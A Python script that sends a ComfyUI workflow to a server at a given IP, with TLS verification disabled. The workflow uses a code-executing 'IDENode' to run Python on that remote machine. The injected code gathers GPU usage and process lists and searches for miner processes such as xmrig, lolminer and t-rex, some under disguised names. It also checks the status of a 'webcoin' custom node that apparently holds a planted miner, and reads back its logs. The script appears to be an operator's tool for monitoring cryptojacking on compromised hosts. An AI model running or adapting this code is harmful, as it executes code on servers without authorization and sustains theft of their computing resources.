import json, urllib.request, ssl, sys, time

IP = sys.argv[1]
BASE = f"https://{IP}:443"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

code = """
import os, subprocess, glob
lines = []

# GPU info
try:
    r = subprocess.run(['nvidia-smi', '--query-gpu=name,temperature.gpu,utilization.gpu,memory.used,memory.total,memory.free', '--format=csv,noheader'], capture_output=True, text=True, timeout=10)
    lines.append(f'GPU: {r.stdout.strip()}')
except Exception as e:
    lines.append(f'nvidia-smi: {e}')

# GPU process list
try:
    r = subprocess.run(['nvidia-smi', '--query-compute-apps=pid,process_name,used_memory', '--format=csv,noheader'], capture_output=True, text=True, timeout=10)
    lines.append(f'GPU_PROCS: {r.stdout.strip()}')
except:
    pass

# Running miner processes
try:
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
    for line in r.stdout.splitlines():
        low = line.lower()
        if any(x in low for x in ['trex', 't-rex', 'lolminer', 'comfyui_render', 'xmrig', 'comfyui_service', 'sglang', 'fishaudio']):
            lines.append(f'PROC: {line.strip()[:250]}')
except Exception as e:
    lines.append(f'ps error: {e}')

# Find webcoin
cn_candidates = glob.glob('/opt/ComfyUI/custom_nodes') + glob.glob('/app/ComfyUI/custom_nodes') + glob.glob('/home/*/comfy/ComfyUI/custom_nodes') + glob.glob('/home/*/ComfyUI/custom_nodes') + glob.glob('/workspace/ComfyUI/custom_nodes')
wc = None
for cn in cn_candidates:
    w = os.path.join(cn, 'webcoin')
    if os.path.isdir(w):
        wc = w
        break

if wc:
    lines.append(f'webcoin: {wc}')
    lines.append(f'.initialized={os.path.exists(os.path.join(wc, ".initialized"))}')
    lines.append(f'.orch.pid={os.path.exists(os.path.join(wc, ".orch.pid"))}')
    bin_dir = os.path.join(wc, 'bin')
    if os.path.isdir(bin_dir):
        lines.append(f'bin: {os.listdir(bin_dir)}')
        mt = os.path.join(bin_dir, '.gpu_miner_type')
        if os.path.exists(mt):
            with open(mt) as f:
                lines.append(f'miner_type={f.read().strip()}')
        rlog = os.path.join(bin_dir, 'render.log')
        if os.path.exists(rlog):
            with open(rlog, 'r', errors='replace') as f:
                rl = f.readlines()
            lines.append(f'render.log lines={len(rl)}')
            for l in rl[-30:]:
                lines.append(f'R: {l.rstrip()[:250]}')
        else:
            lines.append('render.log not found')
    else:
        lines.append('bin dir missing')
else:
    lines.append('webcoin not found')

result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"},
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]},
        },
    }
}

data = json.dumps(prompt).encode()
req = urllib.request.Request(f"{BASE}/prompt", data=data, headers={"Content-Type": "application/json"})
resp = urllib.request.urlopen(req, data, timeout=10, context=ctx)
pid = json.loads(resp.read().decode()).get("prompt_id", "")
print(f"[{IP}] prompt_id: {pid}")

time.sleep(12)

resp2 = urllib.request.urlopen(f"{BASE}/history/{pid}", timeout=10, context=ctx)
hist = json.loads(resp2.read().decode())
entry = hist.get(pid, {})
status = entry.get("status", {}).get("status_str", "pending")
print(f"[{IP}] status: {status}")
outputs = entry.get("outputs", {})
for nid, nout in outputs.items():
    for key, val in nout.items():
        if isinstance(val, list):
            for v in val:
                print(v)
        else:
            print(val)
msgs = entry.get("status", {}).get("messages", [])
for m in msgs:
    if m[0] == "execution_error":
        print(f"ERROR: {m[1].get('exception_type')}: {m[1].get('exception_message','')[:500]}")
